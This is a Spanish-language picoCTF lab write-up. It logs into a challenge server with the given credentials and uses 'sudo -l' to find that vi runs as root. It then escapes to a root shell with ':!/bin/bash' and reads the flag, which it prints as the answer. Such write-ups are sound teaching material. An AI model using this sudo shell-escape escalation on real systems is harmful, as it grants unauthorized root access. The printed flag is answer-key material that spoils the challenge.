#Software #Hacking #Principiante
# Definición
Can you read files in the root file?
The system admin has provisioned an account for you on the main server:`ssh -p 56768 picoplayer@saturn.picoctf.net`Password: `NBD+zO8s4y`Can you login and read the root file?
# Hints
What permissions do you have?
# Solución
Primero nos conectamos al servidor usando [[SSH]].

```bash
AsumomezaC-picoctf@webshell:~$ ssh -p 56768 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:56768 ([13.59.203.175]:56768)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:7: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:56768' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
```

Después vemos que archivos y carpetas tenemos disponibles en el servidor usando [[ls]].

```bash
picoplayer@challenge:~$ ls -l
total 0
```

Vemos que aparentemente no hay nada por lo que buscamos archivos ocultos ([[ls#b) Mostrar archivos ocultos (`-a`)]]).

```bash
picoplayer@challenge:~$ ls -la
total 12
drwxr-xr-x 1 picoplayer picoplayer   20 Feb 22 23:31 .
drwxr-xr-x 1 root       root         24 Aug  4  2023 ..
-rw-r--r-- 1 picoplayer picoplayer  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoplayer picoplayer 3771 Feb 25  2020 .bashrc
drwx------ 2 picoplayer picoplayer   34 Feb 22 23:31 .cache
-rw-r--r-- 1 picoplayer picoplayer  807 Feb 25  2020 .profile
```

Ahí notamos que tenemos una carpeta llamada root. Esto será importante más adelante.

Por lo que continuamos viendo que permisos tenemos (seguimos la [[#Hints]]). Utilizamos el comando [[sudo#4. Uso de `sudo -l` en un servidor SSH]].

```bash
picoplayer@challenge:/$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

Observamos que podemos utilizar el editor [[vi#8. Uso de `sudo vi test` en un servidor]], que nos será muy útil para entrar a la root.

```
picoplayer@challenge:/$ sudo vi test

+

:!/bin/bash
```

Ahora ya nos encontramos en la raíz. Por lo que decidimos checar que contiene.
```bash
root@challenge:/# ls -la
total 12
drwxr-xr-x   1 root   root       68 Feb 22 23:39 .
drwxr-xr-x   1 root   root       68 Feb 22 23:39 ..
-rwxr-xr-x   1 root   root        0 Feb 22 23:29 .dockerenv
-rw-------   1 root   root    12288 Feb 22 23:39 .test.swp
lrwxrwxrwx   1 root   root        7 Mar  8  2023 bin -> usr/bin
drwxr-xr-x   2 root   root        6 Apr 15  2020 boot
d---------   1 root   root       27 Aug  4  2023 challenge
drwxr-xr-x   5 root   root      340 Feb 22 23:29 dev
drwxr-xr-x   1 root   root       66 Feb 22 23:29 etc
drwxr-xr-x   1 root   root       24 Aug  4  2023 home
lrwxrwxrwx   1 root   root        7 Mar  8  2023 lib -> usr/lib
lrwxrwxrwx   1 root   root        9 Mar  8  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root        9 Mar  8  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root       10 Mar  8  2023 libx32 -> usr/libx32
drwxr-xr-x   2 root   root        6 Mar  8  2023 media
drwxr-xr-x   2 root   root        6 Mar  8  2023 mnt
drwxr-xr-x   2 root   root        6 Mar  8  2023 opt
dr-xr-xr-x 248 nobody nogroup     0 Feb 22 23:29 proc
drwx------   1 root   root       23 Aug  4  2023 root
drwxr-xr-x   1 root   root       66 Feb 22 23:37 run
lrwxrwxrwx   1 root   root        8 Mar  8  2023 sbin -> usr/sbin
drwxr-xr-x   2 root   root        6 Mar  8  2023 srv
dr-xr-xr-x  13 nobody nogroup     0 Feb 22 23:29 sys
drwxrwxrwt   1 root   root        6 Aug  4  2023 tmp
drwxr-xr-x   1 root   root       18 Mar  8  2023 usr
drwxr-xr-x   1 root   root       17 Mar  8  2023 var
```

Reafirmamos que el contenido no ha cambiado (pero ahora accedemos como raíz), por lo que accedemos a la raíz.

```bash
root@challenge:/# cd /root/
```

Ahora observamos los nuevos archivos que tenemos.

```bash
root@challenge:~# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   68 Feb 22 23:39 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
```

Finalmente abrimos la flag con [[CAT]].
```bash
root@challenge:~# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}
```
## Respuesta
picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}